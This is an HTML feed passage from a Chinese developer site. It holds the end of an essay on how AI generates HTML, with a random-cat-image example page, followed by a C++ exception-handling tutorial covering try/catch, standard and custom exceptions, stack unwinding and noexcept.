  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"changeBtn"</span>&gt;</span>换一只猫🐱<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">const</span> catImg = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'catImg'</span>);
    <span class="hljs-keyword">const</span> changeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'changeBtn'</span>);
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">getRandomCat</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> w = <span class="hljs-number">300</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">200</span>);
      <span class="hljs-keyword">const</span> h = <span class="hljs-number">200</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">200</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-string">`https://placekitten.com/<span class="hljs-subst">${w}</span>/<span class="hljs-subst">${h}</span>`</span>;
    }
    changeBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
      catImg.<span class="hljs-property">src</span> = <span class="hljs-title function_">getRandomCat</span>();
    });
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<blockquote>
<p>👀 小结：AI 的“创作”不是盲目的拼凑，而是基于概率、语义和逻辑的“推理输出”。</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">⚙️ 第三幕：从 0 到代码的底层秘密</h2>
<p>如果我们把 AI 拆开看（比方说像显微镜下看元件 🧬），背后其实是一连串<strong>矩阵运算和概率计算</strong>：</p>
<ul>
<li>每个词（比如 <code>&lt;button&gt;</code>）都有一个向量表示；</li>
<li>神经元在数十亿个参数中权衡这些词的可能性；</li>
<li>每输出一个字符，都在选择“下一个最合适的词”；</li>
<li>整个过程循环不止，直到写出完整的网页。</li>
</ul>
<p>如果用文字描述这个“过程的节奏”，是这样的：</p>
<blockquote>
<p>向量进 → 概率出 → 再预测 → 再输出 → 一页网页成。</p>
</blockquote>
<p>是不是有点像神经元在弹《编程的肖邦夜曲》？🎹</p>
<hr/>
<h2 data-id="heading-3">🤹 第四幕：AI 与前端的美学冲突</h2>
<p>人类程序员写前端时，常常会考虑：</p>
<ul>
<li>用户体验；</li>
<li>可维护性；</li>
<li>性能优化；</li>
<li>还有“老板喜欢不喜欢这个颜色”。</li>
</ul>
<p>而 AI 写代码的重点是：</p>
<ul>
<li>是否符合语义；</li>
<li>是否逻辑正确；</li>
<li>是否对齐用户的文本意图。</li>
</ul>
<p>AI 不会抱怨“这个改三像素没意义”，<br/>
但也不会因为“看起来舒服”而自发调整色调 🎨。</p>
<p>这正是未来的魅力与挑战——<br/>
<strong>AI懂逻辑，而人类懂情绪；两者结合，才有真正的前端艺术。</strong></p>
<hr/>
<h2 data-id="heading-4">🌈 尾声：当AI写下HTML的那一刻</h2>
<p>AI 写 HTML，不仅是在“输出代码”，<br/>
更像是在讲述用户意图的“结构化故事”。</p>
<p>它懂 <code>&lt;div&gt;</code> 的职责，<br/>
也理解“按钮”是交互的灵魂。<br/>
而我们，则是它的导演、编辑、与灵感缔造者。</p>
<p>最终，这场合作不是替代，而是共创。<br/>
当硅与肉身共同书写网页时，<br/>
未来的 HTML 不只是结构，而是一种诗意的表达 🌌。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[学而时习之：C++中的异常处理1]]></title>    <link>https://juejin.cn/post/7581666412021465097</link>    <guid>https://juejin.cn/post/7581666412021465097</guid>    <pubDate>2025-12-09T11:10:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581666412021465097" data-draft-id="7581408984415649811" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="学而时习之：C++中的异常处理1"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2025-12-09T11:10:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="煤球王子"/> <meta itemprop="url" content="https://juejin.cn/user/4088439235949739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            学而时习之：C++中的异常处理1
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4088439235949739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    煤球王子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T11:10:44.000Z" title="Tue Dec 09 2025 11:10:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">C++ 异常处理</h2>
<p>异常处理是 C++ 提供的一种<strong>结构化机制</strong>，用于在程序运行期间<strong>检测并处理错误</strong>。常见的运行时错误包括：</p>
<ul>
<li>除以零</li>
<li>访问非法内存</li>
<li>文件读写失败</li>
</ul>
<p>C++ 异常处理的工作方式<br/>
当错误发生时，不再让程序直接崩溃，而是通过“抛出 → 捕获 → 处理”的流程进行<strong>优雅恢复</strong>：</p>
<ol>
<li>
<p><strong>抛出异常（throw）</strong><br/>
出现错误或意外情况时，用 <code>throw</code> 关键字“抛出”一个异常对象。</p>
</li>
<li>
<p><strong>捕获异常（catch）</strong><br/>
程序沿着调用栈向上查找<strong>类型匹配</strong>的 <code>catch</code> 块，一旦找到就拦截该异常。</p>
</li>
<li>
<p><strong>处理异常</strong><br/>
<code>catch</code> 块内编写应对逻辑，使程序可以<strong>恢复运行</strong>或<strong>优雅退出</strong>。</p>
</li>
</ol>
<h3 data-id="heading-1">try-catch 块</h3>
<p>C++ 自有的异常处理机制：</p>
<ul>
<li>把<strong>可能出错</strong>的代码放进 <code>try</code> 块；</li>
<li>把<strong>处理错误</strong>的代码放进 <code>catch</code> 块。</li>
</ul>
<p>语法：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 可能抛出异常的代码</span>
}
<span class="hljs-built_in">catch</span> (异常类型 变量) {
    <span class="hljs-comment">// 异常处理代码</span>
}
</code></pre>
<p>执行流程：<br/>
一旦 <code>try</code> 块内抛出异常，<strong>立即中断</strong>后续语句，<strong>跳转</strong>到类型匹配的 <code>catch</code> 块执行；<br/>
若无匹配 <code>catch</code>，异常继续沿调用链向上传递。</p>
<h3 data-id="heading-2">抛出异常（Throwing Exceptions）</h3>
<p>“抛出异常”就是<strong>从 try 块中返回一个代表错误的值</strong>，系统根据该值的类型寻找匹配的 <code>catch</code> 块。<br/>
使用关键字 <code>throw</code> 完成抛出。</p>
<p>语法：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">throw</span> 表达式;
}
<span class="hljs-built_in">catch</span> (类型 变量) {
    <span class="hljs-comment">// 处理代码</span>
}
</code></pre>
<p>可抛出的值分三类：</p>
<ol>
<li>内置类型</li>
<li>标准库异常类</li>
<li>自定义异常类</li>
</ol>
<h4 data-id="heading-3">A.抛出内置类型</h4>
<p>最简单，但几乎不带任何语义信息。示例：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">int</span> x = <span class="hljs-number">7</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (x % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>){
            <span class="hljs-keyword">throw</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 抛出 int 值</span>
        }       <span class="hljs-comment">// 抛出 int 值</span>
    }
    <span class="hljs-built_in">catch</span> (<span class="hljs-type">int</span> e) {       <span class="hljs-comment">// 捕获 int</span>
        cout &lt;&lt; <span class="hljs-string">"捕获异常: "</span> &lt;&lt; e;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">捕获异常: -1</span>
</code></pre>
<p>缺点：必须靠<strong>错误码</strong>判断问题，与 <code>if-else</code> 无异。C++ 推荐的做法是：抛出<strong>带有错误描述</strong>的类对象，而非裸值。</p>
<h4 data-id="heading-4">B.抛出标准异常</h4>
<p>标准异常是一组<strong>已定义好的类</strong>，用于表示常见的各种错误。<br/>
这些类都位于头文件 <code>&lt;stdexcept&gt;</code> 中，并统一继承自基类 <code>std::exception</code>，形成一棵标准的异常类继承树。<br/>
（下图给出了 C++ 标准异常的层次结构。）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8bbdb10ef3a48f3875155ed2348edd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Wk55CD546L5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765883444&amp;x-signature=Ru08z8lOdt%2Br0qZSQ895bdSmPK8%3D" alt="image.png" loading="lazy"/></p>
<p>使用标准异常的好处：</p>
<ul>
<li>语义清晰，可携带详细的错误信息；</li>
<li>与 C++ 标准库异常体系无缝衔接；</li>
<li>支持 <code>what()</code> 成员函数，返回描述性字符串。
这些异常会被 C++ 标准库自身抛出，因此我们必须学会如何处理它们。<br/>
每个标准异常都提供 <code>what()</code> 方法，返回描述异常详情的字符串。</li>
</ul>
<p>示例：<br/>
<code>vector::at()</code> 在索引越界时会抛出 <code>out_of_range</code> 异常。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    vector&lt;<span class="hljs-type">int</span>&gt; v = {<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>};

    <span class="hljs-keyword">try</span> {
        v.<span class="hljs-built_in">at</span>(<span class="hljs-number">10</span>);          <span class="hljs-comment">// 访问越界元素</span>
    }
    <span class="hljs-built_in">catch</span> (out_of_range e) {
        cout &lt;&lt; <span class="hljs-string">"捕获到: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin">捕获到: vector::_M_range_check: __n (which <span class="hljs-keyword">is</span> <span class="hljs-number">10</span>) &gt;= <span class="hljs-keyword">this</span>-&gt;size() (which <span class="hljs-keyword">is</span> <span class="hljs-number">3</span>)
</code></pre>
<p>我们也可以用 <code>throw</code> 语句<strong>手动抛出</strong>这些标准异常。</p>













































<table><thead><tr><th>C++定义好的异常</th><th>主要用途</th><th>典型抛出场景</th></tr></thead><tbody><tr><td><strong><code>out_of_range</code></strong></td><td>访问超出有效范围</td><td><code>vector::at()</code>、<code>string::at()</code>索引越界</td></tr><tr><td><strong><code>length_error</code></strong></td><td>试图创建超过最大长度的对象</td><td><code>string</code>构造函数长度过大，<code>vector::reserve()</code>超限</td></tr><tr><td><strong><code>domain_error</code></strong></td><td>数学运算定义域错误</td><td>数学函数参数不在有效定义域内</td></tr><tr><td><strong><code>invalid_argument</code></strong></td><td>函数参数无效</td><td>参数不符合函数要求</td></tr><tr><td><strong><code>range_error</code></strong></td><td>计算结果超出有意义的值域</td><td>浮点数运算结果精度损失</td></tr><tr><td><strong><code>overflow_error</code></strong></td><td>算术运算上溢</td><td>计算结果超出数据类型上限</td></tr><tr><td><strong><code>underflow_error</code></strong></td><td>算术运算下溢</td><td>计算结果低于数据类型下限</td></tr></tbody></table>
<h4 data-id="heading-5">C.抛出自定义异常</h4>
<p>当标准异常无法满足需求时，可以<strong>自己写一个异常类</strong>。<br/>
推荐继承 <code>std::exception</code>，这样就能与标准库的异常体系无缝衔接（当然不强制）。</p>
<p>完整示例：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-comment">/* ---------- 自定义异常类 ---------- */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NegativeValueException</span> : <span class="hljs-keyword">public</span> exception {
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">int</span> value;                      <span class="hljs-comment">// 保存出错数值</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">NegativeValueException</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span> : value(val) {</span>}

    <span class="hljs-comment">// 重写 what()，返回错误描述</span>
    <span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-title">what</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> <span class="hljs-keyword">noexcept</span> <span class="hljs-keyword">override</span> </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"出现负值错误！"</span>;
    }

    <span class="hljs-comment">// 可选：提供接口获取当时传入的非法值</span>
    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getValue</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{ <span class="hljs-keyword">return</span> value; }
};

<span class="hljs-comment">/* ---------- 可能抛出异常的函数 ---------- */</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">checkValue</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>{
    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span>)
        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">NegativeValueException</span>(x);   <span class="hljs-comment">// 抛出自定义异常对象</span>
    <span class="hljs-keyword">else</span>
        cout &lt;&lt; <span class="hljs-string">"数值为: "</span> &lt;&lt; x &lt;&lt; endl;
}

<span class="hljs-comment">/* ---------- 使用示例 ---------- */</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">int</span> numbers[] = {<span class="hljs-number">10</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">20</span>};

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> n : numbers) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-built_in">checkValue</span>(n);
        }
        <span class="hljs-built_in">catch</span> (NegativeValueException&amp; e) {          <span class="hljs-comment">// 捕获自定义异常</span>
            cout &lt;&lt; <span class="hljs-string">"捕获异常: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; <span class="hljs-string">" 非法值 = "</span> &lt;&lt; e.<span class="hljs-built_in">getValue</span>() &lt;&lt; endl;
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">数值为: 10</span>
<span class="hljs-section">捕获异常: 出现负值错误！ 非法值 = -5</span>
<span class="hljs-section">数值为: 20</span>
</code></pre>
<h3 data-id="heading-6">捕获异常catch</h3>
<p>如前所述，<code>catch</code> 块用来接收并处理 <code>try</code> 块中抛出的异常。 <code>catch</code> 括号里必须写一个<strong>与抛出异常同类型</strong>的形参：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">catch</span> (异常类型 e) {
    <span class="hljs-comment">// 处理语句</span>
}
</code></pre>
<p>其中 <code>e</code> 是给异常对象起的名字。 只有当 <code>try</code> 块里抛出的异常类型与这里的 <code>异常类型</code> 匹配时，才会进入该 <code>catch</code> 块执行其内部的代码。</p>
<h4 data-id="heading-7">A.捕获多种异常</h4>
<p>一个 <code>try</code> 块后面可以跟<strong>多个</strong> <code>catch</code> 块，用来分别处理不同类型的异常。例如：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 可能抛出多种异常的代码</span>
}
<span class="hljs-built_in">catch</span> (类型<span class="hljs-number">1</span> e) {
    <span class="hljs-comment">// 当抛出的异常是类型1 时执行</span>
}
<span class="hljs-built_in">catch</span> (类型<span class="hljs-number">2</span> e) {
    <span class="hljs-comment">// 当抛出的异常是类型2 时执行</span>
}
<span class="hljs-built_in">catch</span> (...) {
    <span class="hljs-comment">// 兜底：前面都没匹配到时执行</span>
}
</code></pre>
<p>说明</p>
<ul>
<li>编译器会按<strong>从上到下的顺序</strong>寻找第一个类型匹配的 <code>catch</code>；</li>
<li><code>catch(...)</code> 称为“通配捕获”，可接住<strong>任何类型</strong>的异常，常用来做<strong>最后兜底</strong>处理。</li>
</ul>
<h4 data-id="heading-8">B.按值或按引用捕获</h4>
<p>与函数传参一样，<code>catch</code> 也能“按值”或“按引用”接收异常对象，两者各有用途。</p>
<h5 data-id="heading-9">B1. 按值捕获</h5>
<p>会<strong>复制</strong>一份被抛出的异常对象。 由于异常对象通常不大，复制开销一般可接受。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">catch</span> (runtime_error e)          <span class="hljs-comment">// 按值</span>
{
    cout &lt;&lt; <span class="hljs-string">"Caught: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>();
}
</code></pre>
<h5 data-id="heading-10">B2. 按引用捕获</h5>
<p>直接绑定到原异常对象，<strong>无复制开销</strong>； 核心优势在于支持<strong>多态</strong>：可以用基类引用捕获派生类异常，从而一个 <code>catch</code> 就能处理整个继承体系。</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">catch</span> (exception&amp; e)             <span class="hljs-comment">// 按引用（基类）</span>
{
    cout &lt;&lt; <span class="hljs-string">"Caught: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>();
}
</code></pre>
<p>示例中抛出的是 <code>runtime_error</code>，却被 <code>exception&amp;</code> 成功捕获，这就是<strong>多态异常处理</strong>的典型用法。</p>
<h2 data-id="heading-11">异常传播</h2>
<p>异常传播描述“异常在调用栈中如何向上传递”。</p>
<ol>
<li>一旦 <code>throw</code> 抛出异常，<strong>当前代码块立即终止</strong>，栈上已构造的局部对象会被<strong>自动析构</strong>（栈回溯），但 <code>new</code> 出来的动态资源需要手动释放。</li>
<li>运行时沿着调用链<strong>逐帧向上</strong>查找类型匹配的 <code>catch</code> 块，这一过程称为 <strong>stack unwinding（栈展开）</strong>。</li>
<li>找到对应 <code>catch</code> 即捕获并处理；若最终仍未匹配，程序调用 <code>std::terminate()</code> 终止。</li>
</ol>
<p>示例流程：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GfG</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">GfG</span>()  { cout &lt;&lt; <span class="hljs-string">"Object Created\n"</span>; }
    ~<span class="hljs-built_in">GfG</span>() { cout &lt;&lt; <span class="hljs-string">"Object Destroyed\n"</span>; }
};

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">try</span> {
        cout &lt;&lt; <span class="hljs-string">"Inside try block\n"</span>;
        GfG gfg;      <span class="hljs-comment">// 构造局部对象</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-number">10</span>;     <span class="hljs-comment">// 抛出异常</span>
        cout &lt;&lt; <span class="hljs-string">"After throw\n"</span>;  <span class="hljs-comment">// 不会执行</span>
    }
    <span class="hljs-built_in">catch</span> (<span class="hljs-type">int</span> e) {
        cout &lt;&lt; <span class="hljs-string">"Exception Caught\n"</span>;
    }
    cout &lt;&lt; <span class="hljs-string">"After catch"</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Inside</span> <span class="hljs-keyword">try</span> block
<span class="hljs-title class_">Object</span> <span class="hljs-title class_">Created</span>
<span class="hljs-title class_">Object</span> <span class="hljs-title class_">Destroyed</span>     ← 栈展开时自动析构
<span class="hljs-title class_">Exception</span> <span class="hljs-title class_">Caught</span>
<span class="hljs-title class_">After</span> <span class="hljs-keyword">catch</span>
</code></pre>
<h2 data-id="heading-12">嵌套 try-catch 块</h2>
<p>在 C++ 里，<code>try-catch</code> 块可以<strong>嵌套</strong>在另一个 <code>try</code> 或 <code>catch</code> 块内部。结构如下：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">try</span> {                      <span class="hljs-comment">// 外层</span>
    <span class="hljs-comment">// ... 可能抛 e2</span>
    <span class="hljs-keyword">try</span> {                  <span class="hljs-comment">// 内层</span>
        <span class="hljs-comment">// ... 可能抛 e1</span>
    }
    <span class="hljs-built_in">catch</span> (eType1 e1) {    <span class="hljs-comment">// 内层只匹配 eType1</span>
        <span class="hljs-comment">// 处理 e1</span>
    }
}
<span class="hljs-built_in">catch</span> (eType2 e2) {        <span class="hljs-comment">// 外层可处理内层未接住的其他异常</span>
    <span class="hljs-comment">// 处理 e2</span>
}
</code></pre>
<ul>
<li>若内层抛出的异常<strong>不是</strong> <code>eType1</code>，内层 <code>catch</code> 不会执行，异常继续<strong>向外层传播</strong>，由外层 <code>catch</code> 尝试匹配。</li>
<li>如此可形成<strong>多级</strong>异常处理链。</li>
</ul>
<hr/>
<p>重新抛出异常（Rethrow） 在内层 <code>catch</code> 中，可用<strong>空 throw 语句</strong>：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">throw</span>;   <span class="hljs-comment">// 必须位于 catch 块内</span>
</code></pre>
<p>把已捕获的异常<strong>原样再次抛出</strong>，保留其类型与信息，供<strong>更外层</strong> <code>catch</code> 继续处理。<br/>
这种方式常用于<strong>分层处理</strong>：底层记录日志/做清理，上层决定最终策略。</p>
<h2 data-id="heading-13">异常规格说明</h2>
<p>C++ 允许在函数声明中<strong>显式说明</strong>该函数是否可能抛出异常。现代 C++ 只有两种规格：</p>

















<table><thead><tr><th>规格</th><th>含义</th></tr></thead><tbody><tr><td><code>noexcept</code></td><td><strong>保证</strong>此函数<strong>不会抛出异常</strong>；若运行时仍抛出，将调 <code>std::terminate()</code> 终止程序。</td></tr><tr><td><code>noexcept(false)</code></td><td><strong>可能抛出异常</strong>；这是<strong>默认行为</strong>（不写任何规格时即为此）。</td></tr></tbody></table>
<p>写法示例：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> <span class="hljs-keyword">noexcept</span>          <span class="hljs-comment">// 承诺不抛异常</span>
</span>{
